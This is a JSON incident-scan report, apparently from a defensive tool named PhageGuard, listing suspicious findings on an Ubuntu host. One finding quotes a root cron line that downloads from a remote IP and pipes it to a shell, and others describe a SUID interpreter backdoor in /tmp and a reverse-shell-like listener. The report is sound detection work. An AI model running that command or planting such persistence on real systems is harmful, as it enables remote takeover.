@@ -1,0 +1,78 @@
+{
+  "run_id": "f1d2e3c4-5b6a-7890-abcd-ef0123456789",
+  "timestamp": "2026-05-23T18:42:11Z",
+  "schema_version": "1.0",
+  "host": {
+    "os": "linux",
+    "distro": "ubuntu",
+    "version": "24.04",
+    "kernel": "6.8.0-31-generic",
+    "hostname": "redacted"
+  },
+  "tools_used": ["ps", "ss", "systemctl", "find", "stat", "sha256sum"],
+  "tools_missing": ["clamav", "yara"],
+  "findings": [
+    {
+      "id": "F-001",
+      "severity": "high",
+      "category": "persistence",
+      "title": "Cron job fetches and executes remote code as root",
+      "evidence": {
+        "path": "/etc/cron.d/update-check",
+        "owner": "root",
+        "mtime": "2026-05-22 03:14:07",
+        "content_excerpt": "* * * * * root curl -s http://198.51.100.7/x | sh",
+        "sha256": "9f2c...redacted"
+      },
+      "why_suspicious": "Runs every minute as root and pipes a remote download straight into a shell. Matches the high-severity cron pattern in references/linux_indicators.md.",
+      "recommended_action": "Review the file. If unrecognized, isolate the host and quarantine the file using a dedicated remediation tool. PhageGuard will not modify it."
+    },
+    {
+      "id": "F-002",
+      "severity": "high",
+      "category": "suid",
+      "title": "SUID bit set on an interpreter in a non-standard path",
+      "evidence": {
+        "path": "/tmp/.cache/python3",
+        "mode": "4755",
+        "owner": "root",
+        "expected": false
+      },
+      "why_suspicious": "A root-owned SUID interpreter under /tmp is a classic privilege-escalation backdoor. Not in the SUID allowlist.",
+      "recommended_action": "Do not execute it. Capture its hash, then review with a remediation workflow."
+    },
+    {
+      "id": "F-003",
+      "severity": "medium",
+      "category": "network",
+      "title": "Unexpected listener bound to all interfaces on a high port",
+      "evidence": {
+        "proto": "tcp",
+        "local": "0.0.0.0:48291",
+        "process": "users:((\"bash\",pid=20413,fd=3))"
+      },
+      "why_suspicious": "A shell owning a socket listening on all interfaces is reverse-shell shaped. Correlated with process inventory.",
+      "recommended_action": "Identify pid 20413 and the parent process. If unrecognized, treat as active compromise."
+    },
+    {
+      "id": "F-004",
+      "severity": "info",
+      "category": "recent_changes",
+      "title": "Config files in /etc changed during a package update window",
+      "evidence": {
+        "path": "/etc/apt/apt.conf.d/20auto-upgrades",
+        "mtime": "2026-05-23 06:00:12",
+        "owner": "root",
+        "mode": "644"
+      },
+      "why_suspicious": "Recent change, but timestamp aligns with an unattended-upgrades run. Likely benign; surfaced for completeness.",
+      "recommended_action": "No action needed unless the change is unexplained."
+    }
+  ],
+  "summary": "2 high, 1 medium, 1 info. Two findings (F-001, F-002) are strongly consistent with an active compromise and warrant immediate review. ClamAV and YARA were not installed, so signature/rule scans were skipped.",
+  "next_steps": [
+    "Review F-001 and F-002 immediately; consider isolating the host",
+    "Identify the process behind the listener in F-003",
+    "Install ClamAV and YARA to enable signature and rule-based scans (Phase 2)"
+  ]
+}
